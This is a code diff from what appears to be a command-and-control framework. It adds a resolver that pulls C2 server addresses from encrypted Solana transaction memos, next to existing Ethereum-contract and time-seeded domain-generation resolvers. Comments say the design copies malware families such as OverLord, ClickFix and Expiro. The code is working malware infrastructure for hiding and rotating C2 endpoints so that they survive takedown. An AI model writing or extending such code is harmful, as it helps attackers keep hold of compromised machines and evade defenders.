@@ -28,8 +28,9 @@ import (
 const c2ResolverMaxResponse = 64 << 10 // 64 KiB
 
 const (
-	c2ResolverKindChain = "chain" // on-chain eth_call / account data
-	c2ResolverKindDGA   = "dga"   // time-seeded generated domains
+	c2ResolverKindChain  = "chain"  // on-chain eth_call / account data
+	c2ResolverKindDGA    = "dga"    // time-seeded generated domains
+	c2ResolverKindSolana = "solana" // Solana transaction memo (OverLord / ClickFix)
 )
 
 // c2ResolverSpec is the decoded form of C2ResolverStr (JSON, injected at build
@@ -38,9 +39,14 @@ const (
 //	{"kind":"chain","rpc":"https://ethereum-rpc.publicnode.com",
 //	 "contract":"0x9999...","data":"0xc2fb26a6","cap":4}
 //	{"kind":"dga","seed":"forgec2","tld":"biz","count":128,"period_minutes":30}
+//	{"kind":"solana","rpc":"https://api.mainnet-beta.solana.com",
+//	 "address":"<memo-program-signer>","token":"<agent-token>","cap":4}
 //
 // `cap` limits how many resolved addresses are published; `count` is the DGA
 // ring size and `period_minutes` the rotation window (Expiro uses 128/30).
+// For `solana`, `address` is the account whose recent transactions are scanned
+// and `token` is the shared secret whose SHA-256 is the AES-256-GCM key for the
+// memo (OverLord uses SHA256(agentToken) as the key).
 type c2ResolverSpec struct {
 	Kind          string `json:"kind"`
 	RPC           string `json:"rpc"`
@@ -51,6 +57,10 @@ type c2ResolverSpec struct {
 	TLD           string `json:"tld"`
 	Count         int    `json:"count"`
 	PeriodMinutes int    `json:"period_minutes"`
+	// Solana-specific fields.
+	Address string   `json:"address"`
+	Token   string   `json:"token"`
+	RPCs    []string `json:"rpcs"`
 }
 
 func parseC2ResolverSpec(raw string) (c2ResolverSpec, error) {
@@ -82,6 +92,22 @@ func parseC2ResolverSpec(raw string) (c2ResolverSpec, error) {
 		}
 		if spec.PeriodMinutes <= 0 || spec.PeriodMinutes > 1440 {
 			spec.PeriodMinutes = 30
+		}
+	case c2ResolverKindSolana:
+		// RPCs may be a single RPC or a list; normalize the single form.
+		if spec.RPC != "" && len(spec.RPCs) == 0 {
+			spec.RPCs = []string{spec.RPC}
+		}
+		if len(spec.RPCs) == 0 || spec.Address == "" || spec.Token == "" {
+			return spec, fmt.Errorf("solana resolver needs rpcs, address and token")
+		}
+		for _, rpc := range spec.RPCs {
+			if !strings.HasPrefix(strings.ToLower(rpc), "https://") {
+				return spec, fmt.Errorf("solana resolver rpc must be https")
+			}
+		}
+		if spec.Cap <= 0 || spec.Cap > 16 {
+			spec.Cap = 4
 		}
 	default:
 		return spec, fmt.Errorf("unknown resolver kind %q", spec.Kind)
@@ -312,6 +338,8 @@ func resolveC2URLs(c *http.Client, raw string, now time.Time) ([]string, error) 
 		// Count already bounds the ring (max 512 enforced by the parser), so
 		// publish the whole generated list — there is no second cap here.
 		return dgaDomains(spec, now), nil
+	case c2ResolverKindSolana:
+		return resolveSolanaC2(c, spec)
 	}
 	return nil, fmt.Errorf("unhandled resolver kind")
 }
